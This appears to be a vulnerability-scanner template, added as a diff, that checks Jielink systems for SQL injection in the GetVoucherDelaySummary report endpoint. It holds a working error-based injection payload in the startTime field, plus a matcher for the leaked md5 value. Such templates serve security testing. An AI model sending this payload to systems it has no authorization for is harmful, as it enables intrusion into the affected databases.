@@ -1,0 +1,28 @@
+id: Jielink-GetVoucherDelaySummary-sqli
+
+info:
+  name: Jielink-GetVoucherDelaySummary-sqli
+  author: HuanXiong
+  severity: critical
+
+  tags: SQL Injection
+
+http:
+  - raw:
+    - |
+      POST /report/FinanceDetail/GetVoucherDelaySummary HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+      Accept: application/json, text/plain, */*
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      X-Requested-With: XMLHttpRequest
+      Connection: close
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 66
+      
+      endTime=2023-12-04+23%3A59%3A59&startTime=1'and/**/extractvalue(1,concat(char(126),md5(1)))and'
+
+    matchers:
+      - type: dsl
+        dsl: 
+          - 'status_code==200 && contains_all(body,"c4ca4238a0b923820dcc509a6f75849")'
